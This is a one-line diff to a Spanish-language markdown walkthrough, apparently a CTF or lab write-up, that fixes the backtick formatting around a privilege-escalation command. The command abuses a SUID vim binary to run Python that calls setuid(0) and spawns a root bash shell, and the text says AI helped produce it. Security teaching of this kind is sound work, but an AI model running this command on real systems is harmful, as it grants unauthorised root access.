@@ -63,7 +63,7 @@ Luego de esta búsqueda, vemos que vim tiene permisos especiales (s) lo que sign
   
   Sabiendo esto, luego de una investigación y con ayuda de la IA generamos un codigo que nos ayudará a escalar privilegios
   
- `vim.basic -c ':python3 import os, pty; os.setuid(0); pty.spawn("/bin/bash")' 
+ `vim.basic -c ':python3 import os, pty; os.setuid(0); pty.spawn("/bin/bash")' `
  
  **vamos a entender este comando** 
  
